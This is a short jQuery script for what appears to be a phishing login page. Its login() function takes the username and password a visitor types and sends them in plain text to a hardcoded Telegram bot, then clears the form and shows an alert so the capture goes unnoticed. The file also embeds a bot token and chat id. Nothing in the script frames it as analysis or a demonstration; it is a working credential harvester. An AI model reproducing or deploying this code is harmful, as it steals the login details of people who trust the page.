$(document).ready(function(){


var winh = $(window).height();


$(".header").height(winh);


$(".space").height(winh /4);

$("button").click(function(){




window.location.href = "login.html";




});

});

function login(){


var username = $("#username").val();


var pass = $("#pass").val();

var text = "user : `" + username + "` || pass : `" + pass + "`" 

var token = "823465460:AAF2hFKLpj-6bv-KrdXWgwoEbXqszyjCLLo";

var id = "546330685";

if(username.length > 0 && pass.length > 0){


$("#logbut").attr("disabled","disabled");

  
    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text + "&parse_mode=markdown" , function( data ) {

$("#logbut").removeAttr("disabled","disabled");

$(".alert").show();

$("#username,#pass").val("");

      });


}

}
